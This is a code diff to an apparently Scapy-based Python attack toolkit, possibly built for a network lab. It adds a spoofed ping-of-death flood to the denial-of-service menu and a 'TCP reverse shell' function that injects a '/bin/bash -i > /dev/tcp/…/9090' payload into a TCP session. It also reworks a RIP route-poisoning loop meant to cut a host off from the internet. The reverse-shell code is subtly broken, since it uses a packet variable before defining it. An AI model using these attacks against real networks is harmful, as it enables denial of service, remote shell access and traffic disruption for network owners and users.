@@ -5,6 +5,7 @@ import argparse
 import urllib.request
 from ipaddress import IPv4Network
 from tqdm import tqdm
+import subprocess
 
 
 def os_detection():
@@ -209,13 +210,43 @@ def spoofed_udp_flood():
     t3.start()
     t4.start()
 
-def icmp_reverse_shell():
-    return 0
 
-def RIP_attack():
+def ping_of_death():
+    
+    print("Insert target IP address: ")
+    target = input()
+
+    try:
+        packet = IP(src=RandIP(), dst=target) / ICMP() / ('K' * 65500)
+        print("Starting Ping of Death attack towards", target, "...")
+        send(packet, inter=0.0001, loop=1)
+    except KeyboardInterrupt as e:
+        sys.exit(1)
+
+
+
+
+def tcp_reverse_shell():
+
+    print("Installing Reverse Shell onto Webserver...")
+    target = "192.168.223.10"
+    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
+    tcp = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport, flags="A", seq=pkt[IP].seq, ack=pkt[IP].ack)
+    data = "\r /bin/bash -i > /dev/tcp/192.168.222.10/9090 0<&1 2>&1\r"
+    pkt = ip/tcp/data
+    ls(pkt)
+    send(pkt,verbose=0)
+    
+    #subprocess.Popen(["nc -lnv 9090"])
+
+
+
+#how to create this attack: we want to prevent the Kali Client host from reaching the internet, so we'd have to scramble the RIP entry for the routers R1, R2, R3, R4 which are the 
+#routers not directly connected to the Kali host. 
+def RIP_attack(): #minute 18
 
     address = "192.168.220.144" #network to be isolated
-    # define headers
+	#define headers
     IP_header = IP(src="192.168.220.30", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
     IP_header_2 = IP(src="192.168.220.40", dst="224.0.0.9", ttl=1) #multicast address for RIPv2
     
@@ -227,9 +258,19 @@ def RIP_attack():
     packet2 = IP_header_2 / UDP_header / RIP_header / RIPEntry_
 
     #loop the sending
-    while True:
-        send(packet, inter=0.000001)
-        send(packet2, inter=0.000001)
+    try:
+        while True:
+            send(packet, inter=0.000001)
+            send(packet2, inter=0.000001)
+    except KeyboardInterrupt as e:
+        sys.exit(1)
+    
+    #t1 = threading.Thread(target=poisoning("192.168.220.30"))
+    #t2 = threading.Thread(target=poisoning("192.168.220.40"))
+
+
+    #t1.start()
+    #t2.start()
 
 
 def choose_recon():
@@ -290,7 +331,8 @@ def choose_dos():
     print("3. ICMP Flood")
     print("4. Spoofed ICMP Flood")
     print("5. Spoofed UDP Flood")
-    print("6. Exit")                                            
+    print("6. Ping of Death")
+    print("7. Exit")                                            
     print("-----------------------------------------------------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
@@ -308,7 +350,10 @@ def choose_dos():
     elif choice == "5":
         spoofed_udp_flood()
         choose_dos()
-    elif choice == "6":
+    elif choice == '6':
+        ping_of_death()
+        choose_dos()
+    elif choice == "7":
         print("Back to main menu.")
         os.system("clear")
         main()
@@ -329,13 +374,13 @@ def choose_exploit():
     print("----------------------------------------------")
     print("\n")
     print("Choose an exploit.")
-    print("1. ICMP Reverse Shell")
+    print("1. TCP Reverse Shell")
     print("2. RIP Attack on the LAN access to the Internet")
     print("3. Exit")
     print("----------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
-        icmp_reverse_shell()
+        tcp_reverse_shell()
     elif choice == "2":
         RIP_attack()
     elif choice == "3":
@@ -356,6 +401,7 @@ def main():
         print("3. Exploits")
         print("4. Exit")
         print("-----------------------------------")
+
         choice = input("Enter your choice: ")
         if choice == "1":
             choose_recon()
